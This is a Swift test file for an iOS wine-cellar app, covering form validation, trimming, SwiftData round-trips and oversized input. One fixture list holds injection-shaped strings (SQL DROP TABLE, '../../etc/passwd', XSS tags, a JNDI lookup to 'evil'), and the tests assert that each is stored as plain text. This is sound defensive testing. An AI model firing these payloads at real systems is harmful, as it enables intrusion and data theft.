import Foundation
import SwiftData
import Testing

@testable import Vinnota

// MARK: - Fixtures

/// Strings that are dangerous in some *other* system (SQL, a filesystem path,
/// a `printf`-style formatter, an HTML renderer). Vinnota stores them in
/// SwiftData and renders them through SwiftUI `Text`, both of which are
/// value-safe, so the property worth locking down is that they are treated as
/// ordinary text: they pass validation, survive a store round-trip byte for
/// byte, and never get interpreted.
private let hostileButOrdinaryText: [String] = [
    "'; DROP TABLE ZWINE; --",
    "Robert'); DROP TABLE Students;--",
    "\" OR 1=1 --",
    "../../etc/passwd",
    "..\\..\\Windows\\System32",
    "/dev/null",
    "%@ %n %s %d %1$@",
    "100%% sure",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${jndi:ldap://evil/x}",
    "Château\u{0301} Margaux \u{1F377}",       // combining mark + emoji
    "\u{202E}gnitset",                          // right-to-left override
]

/// A blank producer keeps `Add to the book` disabled. These are the inputs a
/// user can actually produce with a keyboard or a paste that *look* filled.
private let blankLookingProducers: [String] = [
    " ",
    "      ",
    "\t",
    "\n",
    "\r\n",
    "\t \n \r ",
    "\u{00A0}",                 // NO-BREAK SPACE — what a paste from the web gives you
    "\u{00A0}\u{00A0} \t",
    "\u{200A}",                 // HAIR SPACE
    "\u{2028}",                 // LINE SEPARATOR
    "\u{2029}",                 // PARAGRAPH SEPARATOR
    "\u{3000}",                 // IDEOGRAPHIC SPACE
    "\u{000B}",                 // VERTICAL TAB
    "\u{000C}",                 // FORM FEED
    "\u{0085}",                 // NEXT LINE
    "\u{200B}",                 // ZERO WIDTH SPACE — see the finding below
]

private func form(producer: String) -> WineForm {
    var f = WineForm()
    f.producer = producer
    return f
}

// MARK: - Required fields

@Suite("WineForm required fields")
struct RequiredFieldTests {

    /// An untouched form is missing exactly one thing, and the copy is the copy
    /// the save bar prints. If someone renames the phrase, the hint that reads
    /// "Add the producer first." silently changes with it.
    @Test func emptyFormIsMissingOnlyTheProducer() {
        let f = WineForm()
        #expect(f.missingRequired == ["the producer"])
        #expect(f.isComplete == false)
    }

    @Test func producerAloneCompletesTheForm() {
        let f = form(producer: "Giuseppe Rinaldi")
        #expect(f.missingRequired.isEmpty)
        #expect(f.isComplete)
    }

    /// Year, region and shop are deliberately optional — the form is filled
    /// standing in a shop aisle. Re-requiring any of them must fail here.
    @Test func yearRegionAndShopAreOptional() {
        var f = form(producer: "Giuseppe Rinaldi")
        f.vintage = ""
        f.region = ""
        f.shop = ""
        f.grape = ""
        f.name = ""
        f.price = ""
        f.text = ""
        #expect(f.isComplete, "only the producer may gate a save")
        #expect(f.missingRequired.isEmpty)
    }

    /// The mirror image: filling an optional field must not rescue a form whose
    /// producer is empty. Catches a regression that swaps which field is checked.
    @Test(arguments: [
        \WineForm.vintage, \WineForm.region, \WineForm.shop,
        \WineForm.grape, \WineForm.name, \WineForm.price, \WineForm.text,
    ])
    func optionalFieldAloneDoesNotCompleteTheForm(field: WritableKeyPath<WineForm, String>) {
        var f = WineForm()
        f[keyPath: field] = "something"
        #expect(f.missingRequired == ["the producer"])
        #expect(f.isComplete == false)
    }

    /// The real bug class: " " looks filled in the field but names nothing.
    @Test(arguments: blankLookingProducers)
    func whitespaceOnlyProducerDoesNotSatisfyValidation(producer: String) {
        let f = form(producer: producer)
        #expect(f.producer.isEmpty == false, "precondition: the field is not literally empty")
        #expect(f.missingRequired == ["the producer"])
        #expect(f.isComplete == false)
    }

    /// Which invisible characters `.whitespacesAndNewlines` actually catches,
    /// asserted rather than assumed:
    ///
    /// CAUGHT (treated as blank): U+0009 tab, U+000A/U+000D newline,
    /// U+000B vertical tab, U+000C form feed, U+0085 next line, every Unicode
    /// `Zs` space (U+0020, U+00A0 no-break, U+2000–U+200A, U+202F, U+205F,
    /// U+3000), U+2028/U+2029 separators, and — surprisingly — U+200B ZERO
    /// WIDTH SPACE, which Foundation includes in `.whitespaces` even though its
    /// Unicode category is `Cf`, not `Zs`.
    ///
    /// NOT CAUGHT (passes validation): see the finding below.
    @Test(arguments: [
        "\u{0000}",   // NUL
        "\u{0007}",   // BEL
        "\u{001B}",   // ESC
        "\u{FEFF}",   // ZERO WIDTH NO-BREAK SPACE / BOM
        "\u{180E}",   // MONGOLIAN VOWEL SEPARATOR
        "\u{2060}",   // WORD JOINER
    ])
    func invisibleCharactersThatSlipPastValidation(producer: String) {
        let f = form(producer: producer)
        // FINDING: `String.isBlank` only trims `.whitespacesAndNewlines`, so
        // control characters (U+0000, U+0007, U+001B) and the zero-width
        // formatting characters outside Foundation's whitespace set (U+FEFF,
        // U+180E, U+2060) count as a filled producer. A bottle can be saved
        // with a producer that renders as nothing at all: the card, the detail
        // header and the search index all show an empty name. Reachable by
        // pasting from a spreadsheet or a BOM-prefixed CSV cell.
        // Asserting the real behaviour, not the desired one — a fix would be to
        // trim `.controlCharacters` and `.init(charactersIn: "\u{FEFF}\u{2060}")`
        // as well, in Vinnota/Model/AppState.swift.
        #expect(f.isComplete, "documented current behaviour, not the desired one")
        #expect(f.missingRequired.isEmpty)
        #expect(f.producer.trimmed.isEmpty == false)
    }

    /// A producer with real content is not damaged by the padding around it.
    @Test func paddingAroundRealContentIsIgnoredByValidationAndStrippedByTrimming() {
        let f = form(producer: "  \n\t Domaine Leflaive \u{00A0} ")
        #expect(f.isComplete)
        #expect(f.producer.trimmed == "Domaine Leflaive")
    }

    /// Interior whitespace is content, not padding — `trimmed` must not collapse it.
    @Test func interiorWhitespaceIsPreserved() {
        #expect("  Ch. Le Puy  Barthélemy  ".trimmed == "Ch. Le Puy  Barthélemy")
        #expect("A\nB".trimmed == "A\nB")
    }
}

// MARK: - Loading a saved bottle back into the form

/// `WineForm(editing:)` is the other half of the review-form round trip and is
/// real, directly reachable app code (Vinnota/Model/AppState.swift). Tapping
/// "Edit the bottle" runs it, and whatever it produces is what `save()` writes
/// back — so a field it drops is a field the user silently loses on their next
/// save.
@MainActor
@Suite("WineForm(editing:)")
struct EditRoundTripTests {

    private func saved() -> Wine {
        let wine = Wine(producer: "Giuseppe Rinaldi", name: "Brunate", vintage: "2019",
                        region: "Piemonte, IT", grape: "Nebbiolo", shop: "Vino e Sapori",
                        price: "42.00", currency: .SEK)
        return wine
    }

    /// Every field the edit screen exposes must survive load → save unchanged.
    /// Catches a regression that drops or crosses a field in the initialiser.
    @Test func everyEditableFieldIsCarriedBackIntoTheForm() {
        let wine = saved()
        let f = WineForm(editing: wine)

        #expect(f.producer == "Giuseppe Rinaldi")
        #expect(f.name == "Brunate")
        #expect(f.vintage == "2019")
        #expect(f.region == "Piemonte, IT")
        #expect(f.grape == "Nebbiolo")
        #expect(f.shop == "Vino e Sapori")
        #expect(f.price == "42.00")
        #expect(f.currency == .SEK, "the bottle's currency, not the .EUR default")
        #expect(f.isComplete, "a saved bottle always has a producer")
    }

    /// A bottle loaded for editing must not be re-labelled as hand-entered or
    /// as an OCR reading; `recognized` gates the "Read off the label" banner.
    @Test func editingDoesNotClaimTheFormWasScanned() {
        #expect(WineForm(editing: saved()).recognized == false)
    }

    /// The em dash is the legacy "no cuvée" marker. It must come back as an
    /// empty field, so the user sees the "Cuvée or grape" placeholder rather
    /// than a literal dash they have to delete by hand.
    @Test func legacyEmDashNameLoadsAsAnEmptyCuveeField() {
        let wine = Wine(producer: "Rinaldi", name: "—", vintage: "", region: "",
                        grape: "", shop: "")
        #expect(WineForm(editing: wine).name == "")
    }

    /// Only the exact em-dash sentinel is stripped — a real cuvée that merely
    /// contains a dash is content and must survive.
    @Test(arguments: ["—", "-", "– ", "Clos du —", "——", "Côte-Rôtie"])
    func onlyTheBareEmDashIsTreatedAsNoCuvee(name: String) {
        let wine = Wine(producer: "Rinaldi", name: name, vintage: "", region: "",
                        grape: "", shop: "")
        let expected = name == "—" ? "" : name
        #expect(WineForm(editing: wine).name == expected)
    }

    /// `Wine.price` is optional, `WineForm.price` is not. A priceless bottle
    /// must load as "" — the field renders `price` directly, so a stray
    /// "nil" or a crash would both surface here.
    @Test func aBottleWithNoPriceLoadsAsAnEmptyPriceField() {
        let wine = Wine(producer: "Rinaldi", name: "", vintage: "", region: "",
                        grape: "", shop: "", price: nil)
        let f = WineForm(editing: wine)
        #expect(f.price == "")
        #expect(f.price.isBlank, "so the commit stores nil again, not \"\"")
    }

    /// Load → commit → load must be a fixed point: a second trip through the
    /// edit screen may not mutate anything. This is the property that a
    /// half-applied trim or a dropped field actually breaks.
    @Test func loadingAnEditedFormAgainChangesNothing() {
        let wine = saved()
        let first = WineForm(editing: wine)

        // Apply the form back, as save()'s `existing.… = ….trimmed` block does.
        wine.producer = first.producer.trimmed
        wine.name = first.name.trimmed
        wine.vintage = first.vintage.trimmed
        wine.region = first.region.trimmed
        wine.grape = first.grape.trimmed
        wine.shop = first.shop.trimmed
        wine.price = first.price.isBlank ? nil : first.price.trimmed
        wine.currency = first.currency

        let second = WineForm(editing: wine)
        #expect(second.producer == first.producer)
        #expect(second.name == first.name)
        #expect(second.vintage == first.vintage)
        #expect(second.region == first.region)
        #expect(second.grape == first.grape)
        #expect(second.shop == first.shop)
        #expect(second.price == first.price)
        #expect(second.currency == first.currency)
    }

    /// A saved bottle whose producer is whitespace (possible only via a write
    /// path that skipped validation) must re-block the save, not sail through.
    @Test func aBlankProducerOnAStoredBottleStillBlocksTheEditSave() {
        let wine = Wine(producer: "   ", name: "", vintage: "", region: "",
                        grape: "", shop: "")
        let f = WineForm(editing: wine)
        #expect(f.isComplete == false)
        #expect(f.missingRequired == ["the producer"])
    }
}

// MARK: - The missing-field sentence

@Suite("String.list grammar")
struct MissingFieldProseTests {

    @Test func zeroItemsProduceNothing() {
        #expect(String.list([]) == "")
    }

    @Test func oneItemIsItself() {
        #expect(String.list(["the producer"]) == "the producer")
    }

    @Test func twoItemsAreJoinedByAnd() {
        #expect(String.list(["the producer", "the year"]) == "the producer and the year")
    }

    @Test func threeItemsUseCommasAndAFinalAnd() {
        #expect(String.list(["the producer", "the year", "the region"])
                == "the producer, the year and the region")
    }

    @Test func fourItemsKeepTheSameShape() {
        #expect(String.list(["a", "b", "c", "d"]) == "a, b, c and d")
    }

    /// The sentence the save bar and the toast both build.
    @Test func theHintReadsAsASentenceForAnEmptyForm() {
        let hint = "Add \(String.list(WineForm().missingRequired)) first."
        #expect(hint == "Add the producer first.")
    }

    /// Format specifiers inside a field name are interpolated, not formatted.
    @Test func listDoesNotInterpretFormatSpecifiers() {
        #expect(String.list(["%@", "%n"]) == "%@ and %n")
        #expect("Add \(String.list(["%d %s"])) first." == "Add %d %s first.")
    }
}

// MARK: - What reaches the store

/// Covers the real commit path. `ReviewView.save()` used to inline its field
/// mapping, so this suite could only mirror it — and a mutation that dropped
/// `.trimmed` from the real `save()` left the suite green. The mapping now
/// lives on `WineForm` (`makeWine`, `apply(to:)`, `makeNotes`) and `save()`
/// delegates to it, so these tests exercise the code that actually runs.
@MainActor
@Suite("Commit rules (WineForm.makeWine / apply)")
struct SaveCommitTests {

    /// Delegates to the app's own commit path — deliberately a one-line
    /// forwarder so these tests cannot drift from what `save()` does.
    private func commit(_ form: WineForm, into context: ModelContext) -> Wine {
        let wine = form.makeWine()
        context.insert(wine)
        for note in form.makeNotes() {
            note.wine = wine
            context.insert(note)
        }
        return wine
    }

    private func newContext() throws -> ModelContext {
        let container = try ModelContainer(
            for: Schema([Wine.self, TastingNote.self]),
            configurations: [ModelConfiguration(isStoredInMemoryOnly: true)]
        )
        return ModelContext(container)
    }


    @Test func everyTextFieldIsTrimmedBeforeItIsStored() throws {
        let context = try newContext()
        var f = WineForm()
        f.producer = "  Giuseppe Rinaldi\n"
        f.name = "\tBrunate  "
        f.vintage = " 2019 "
        f.region = "\u{00A0}Piemonte, IT "
        f.grape = " Nebbiolo\t"
        f.shop = "  Vino e Sapori  "
        f.price = "  42.00 "

        let wine = commit(f, into: context)
        try context.save()

        let stored = try #require(try context.fetch(FetchDescriptor<Wine>()).first)
        #expect(stored.producer == "Giuseppe Rinaldi")
        #expect(stored.name == "Brunate")
        #expect(stored.vintage == "2019")
        #expect(stored.region == "Piemonte, IT")
        #expect(stored.grape == "Nebbiolo")
        #expect(stored.shop == "Vino e Sapori")
        #expect(stored.price == "42.00")
        #expect(stored.persistentModelID == wine.persistentModelID)

        // Nothing round-tripped with padding still attached.
        for value in [stored.producer, stored.name, stored.vintage,
                      stored.region, stored.grape, stored.shop, stored.price ?? ""] {
            #expect(value == value.trimmed)
        }
    }

    /// A blank price becomes `nil`, not `""` — `hasPrice` tests `isEmpty == false`,
    /// so a whitespace price would light up the price line with a bare currency symbol.
    @Test(arguments: ["", " ", "\t\n", "\u{00A0}"])
    func blankPriceIsStoredAsNil(price: String) throws {
        let context = try newContext()
        var f = form(producer: "Rinaldi")
        f.price = price

        let wine = commit(f, into: context)
        try context.save()

        #expect(wine.price == nil)
        #expect(wine.hasPrice == false)
    }

    @Test func nonBlankPriceIsStoredTrimmed() throws {
        let context = try newContext()
        var f = form(producer: "Rinaldi")
        f.price = "  18.50  "

        let wine = commit(f, into: context)
        try context.save()

        #expect(wine.price == "18.50")
        #expect(wine.hasPrice)
    }

    /// Why the trimming in `save()` is load-bearing rather than cosmetic:
    /// `subtitle` and `eyebrow` filter on `isEmpty`, not `isBlank`.
    @Test func derivedDisplayStringsDependOnTheCommitHavingTrimmed() throws {
        let context = try newContext()
        var f = form(producer: "Rinaldi")
        f.name = "  Brunate  "
        f.region = "   "      // whitespace-only region, e.g. a stray space typed in
        f.grape = " Nebbiolo "

        let wine = commit(f, into: context)
        try context.save()

        #expect(wine.subtitle == "Brunate")
        #expect(wine.eyebrow == "Nebbiolo")

        // FINDING (latent, currently masked by `save()`): `Wine.subtitle` and
        // `Wine.eyebrow` in Vinnota/Model/Wine.swift drop empty components with
        // `filter { !$0.isEmpty }`, which a whitespace-only string passes. Any
        // future write path that skips `.trimmed` produces a dangling " · ".
        let untrimmed = Wine(producer: "Rinaldi", name: "Brunate", vintage: "",
                             region: "   ", grape: "Nebbiolo", shop: "")
        #expect(untrimmed.subtitle == "Brunate ·    ")
        #expect(untrimmed.eyebrow == "Nebbiolo ·    ")
    }

    /// The em dash is the legacy "no cuvée" marker; a padded one must still
    /// collapse to nothing rather than printing a stray dash.
    @Test func paddedLegacyEmDashNameStillDisplaysAsNoCuvee() throws {
        let context = try newContext()
        var f = form(producer: "Rinaldi")
        f.name = "  —  "

        let wine = commit(f, into: context)
        try context.save()

        #expect(wine.name == "—")
        #expect(wine.displayName == "")
        #expect(wine.subtitle == "")
    }
}

// MARK: - Hostile-looking input is ordinary text

@MainActor
@Suite("Injection-shaped input")
struct HostileInputTests {

    /// Delegates to the app's own commit path — deliberately a one-line
    /// forwarder so these tests cannot drift from what `save()` does.
    private func commit(_ form: WineForm, into context: ModelContext) -> Wine {
        let wine = form.makeWine()
        context.insert(wine)
        for note in form.makeNotes() {
            note.wine = wine
            context.insert(note)
        }
        return wine
    }

    private func newContext() throws -> ModelContext {
        let container = try ModelContainer(
            for: Schema([Wine.self, TastingNote.self]),
            configurations: [ModelConfiguration(isStoredInMemoryOnly: true)]
        )
        return ModelContext(container)
    }

    /// A producer that looks like SQL, a path or a format string is a legal
    /// producer: validation must accept it and trimming must not alter it.
    @Test(arguments: hostileButOrdinaryText)
    func hostileLookingTextIsValidAndUnaltered(value: String) {
        var f = form(producer: value)
        f.name = value
        f.region = value
        f.shop = value
        #expect(f.isComplete)
        #expect(f.missingRequired.isEmpty)
        #expect(f.producer.trimmed == value, "no sanitising, no escaping — stored verbatim")
        #expect(f.producer.isBlank == false)
    }

    /// Round-trips through SwiftData byte for byte, in every text field.
    @Test(arguments: hostileButOrdinaryText)
    func hostileLookingTextRoundTripsThroughTheStore(value: String) throws {
        let context = try newContext()
        let wine = Wine(producer: value.trimmed, name: value.trimmed, vintage: value.trimmed,
                        region: value.trimmed, grape: value.trimmed, shop: value.trimmed,
                        price: value.trimmed)
        context.insert(wine)
        let note = TastingNote(kind: .text, phase: .pre, text: value)
        note.wine = wine
        context.insert(note)
        try context.save()

        let stored = try #require(try context.fetch(FetchDescriptor<Wine>()).first)
        #expect(stored.producer == value)
        #expect(stored.name == value)
        #expect(stored.region == value)
        #expect(stored.shop == value)
        #expect(stored.price == value)
        #expect(Array(stored.producer.unicodeScalars) == Array(value.unicodeScalars))
        #expect(stored.notes.count == 1)
        #expect(stored.notes.first?.text == value)
    }

    /// The one that would matter if SwiftData concatenated instead of binding:
    /// a `DROP TABLE` producer must come back as one row, with the neighbours
    /// still there.
    @Test func sqlShapedProducerIsBoundAsAValueNotExecuted() throws {
        let context = try newContext()
        let payload = "'; DROP TABLE ZWINE; --"
        for name in ["Rinaldi", payload, "Vajra"] {
            context.insert(Wine(producer: name, name: "", vintage: "", region: "",
                                grape: "", shop: ""))
        }
        try context.save()

        let hits = try context.fetch(
            FetchDescriptor<Wine>(predicate: #Predicate { $0.producer == payload })
        )
        #expect(hits.count == 1)
        #expect(hits.first?.producer == payload)
        #expect(try context.fetch(FetchDescriptor<Wine>()).count == 3,
                "the other rows — and the table — survive")
    }

    /// Search takes the same text and must find it, not choke on it.
    @Test(arguments: hostileButOrdinaryText)
    func searchMatchesHostileLookingTextLiterally(value: String) {
        let wine = Wine(producer: value, name: "", vintage: "", region: "",
                        grape: "", shop: "")
        #expect(wine.matches(query: value))
        #expect(wine.matches(query: ""))
        #expect(wine.matches(query: "   "))
        #expect(wine.matches(query: "definitely-not-in-there") == false)
    }

    /// `Wine.matches` trims `.whitespaces` only, while every other blank check
    /// in the app uses `.whitespacesAndNewlines`. So a space-only query is
    /// "empty" (show everything) but a newline-only query is a literal search
    /// for "\n" and hides the entire cellar.
    @Test func aNewlineOnlyQueryIsNotTreatedAsAnEmptyQuery() {
        let wine = Wine(producer: "Rinaldi", name: "", vintage: "", region: "",
                        grape: "", shop: "")
        #expect(wine.matches(query: " \t "), "spaces and tabs mean no filter")

        // FINDING: asserting the real behaviour, not the desired one. In
        // Vinnota/Model/Wine.swift `matches` uses `.whitespaces`; switching it
        // to `.whitespacesAndNewlines` (or to `query.isBlank`) would make these
        // agree with `isBlank` and with the space-only case above.
        #expect(wine.matches(query: "\n") == false, "documented current behaviour")
        #expect(wine.matches(query: "\r\n") == false, "documented current behaviour")
    }
}

// MARK: - Size

@MainActor
@Suite("Oversized input")
struct LongInputTests {

    @Test func tenThousandCharacterProducerValidatesWithoutCrashing() {
        let long = String(repeating: "Château ", count: 1_250)   // 10_000 characters
        #expect(long.count == 10_000)

        let f = form(producer: long)
        #expect(f.isComplete)
        #expect(f.missingRequired.isEmpty)
        #expect(f.producer.trimmed.count == 9_999, "one trailing space is stripped")
    }

    @Test func tenThousandSpacesIsStillAnEmptyProducer() {
        let f = form(producer: String(repeating: " ", count: 10_000))
        #expect(f.isComplete == false)
        #expect(f.missingRequired == ["the producer"])
        #expect(f.producer.trimmed.isEmpty)
    }

    @Test func longInputBuriedInPaddingIsTrimmedCorrectly() {
        let pad = String(repeating: " ", count: 5_000)
        let body = String(repeating: "x", count: 10_000)
        #expect((pad + body + pad).trimmed == body)
    }

    @Test func longInputSurvivesTheStore() throws {
        let container = try ModelContainer(
            for: Schema([Wine.self, TastingNote.self]),
            configurations: [ModelConfiguration(isStoredInMemoryOnly: true)]
        )
        let context = ModelContext(container)
        let long = String(repeating: "ü", count: 10_000)
        context.insert(Wine(producer: long, name: "", vintage: "", region: "",
                            grape: "", shop: ""))
        try context.save()

        let stored = try #require(try context.fetch(FetchDescriptor<Wine>()).first)
        #expect(stored.producer.count == 10_000)
        #expect(stored.producer == long)
    }

    @Test func longMissingFieldListDoesNotCrash() {
        let many = (0..<1_000).map { "field \($0)" }
        let sentence = String.list(many)
        #expect(sentence.hasPrefix("field 0, field 1, "))
        #expect(sentence.hasSuffix(" and field 999"))
    }
}
